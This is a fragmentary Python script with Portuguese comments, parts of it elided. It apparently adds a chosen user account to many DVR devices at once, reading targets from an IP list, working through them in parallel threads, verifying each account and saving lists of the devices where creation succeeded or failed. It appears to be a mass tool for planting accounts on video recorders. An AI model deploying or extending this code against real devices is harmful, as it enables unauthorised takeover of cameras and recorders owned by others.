...
def adicionar_usuario_dvr(sock, session_alvo, username, password, realm):
    ...
    # Validação Robusta para evitar falso negativo devido a delays de buffer/concorrência
    if data and data.get("result") == True:
        return True, password_hash
    
    # Se der erro ou None no pacote, fazemos uma contraprova em tempo real
    time.sleep(0.5)
    limpar_buffer(sock)
    usuarios_atuais = listar_usuarios(sock, session_alvo)
    if any(u.get('Name') == username for u in usuarios_atuais):
        return True, password_hash
...
def modo_massa_adicionar(arquivo_ips, porta_padrao, novo_user, nova_senha, num_threads):
    ...
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        ...
        for i, (ip, porta) in enumerate(ips_portas, 1):
            ...
            futures[future] = (ip, porta, i)  # guardamos índice original
    ...
    if falhas:
        falhas_file = f"dvr_falhas_{timestamp}.txt"
        with open(falhas_file, 'w', encoding='utf-8') as f:
            f.write(f"# DVRs com FALHA na criação de usuário '{novo_user}'\n")
            f.write(f"# Data: {datetime.now()}\n")
            f.write(f"# Total de falhas: {len(falhas)}/{len(ips_portas)}\n")
            f.write("# Formato: [Índice/Total] IP:PORTA - Motivo\n\n")
            
            for r in falhas:
                motivo = r.get("message", "Falha desconhecida")
                f.write(f"[{r.get('index', '?')}/{len(ips_portas)}] {r['host']}:{r['port']} - {motivo}\n")
        
        print_safe(f"\n📄 Lista de FALHAS salva em: {falhas_file}")
    else:
        print_safe("\n🎉 Nenhuma falha! Todos os DVRs foram processados com sucesso.")
    
    # ====================== ARQUIVO DE SUCESSOS ======================
    if sucessos:
        sucessos_file = f"dvr_sucesso_{timestamp}.txt"
        with open(sucessos_file, 'w', encoding='utf-8') as f:
            f.write(f"# DVRs com usuário '{novo_user}' criado com sucesso\n")
            f.write(f"# Data: {datetime.now()}\n")
            f.write(f"# Total: {len(sucessos)}/{len(ips_portas)}\n\n")
            for r in sucessos:
                f.write(f"{r['host']}:{r['port']}\n")
        print_safe(f"📄 Lista de SUCESSOS salva em: {sucessos_file}")
    ...
    while True:
        ...
        if opcao == "1":
            ...
            if username and password:
                ...
                if sucesso:
                    print_safe(f"[+] ✅ Usuário '{username}' criado com sucesso!")
                else:
                    print_safe("[-] Falha ao criar usuário ou permissões inválidas!")
            else:
            ...
            if username and password:
                try:
                    canal = int(input("Número do canal (1-12): ").strip())
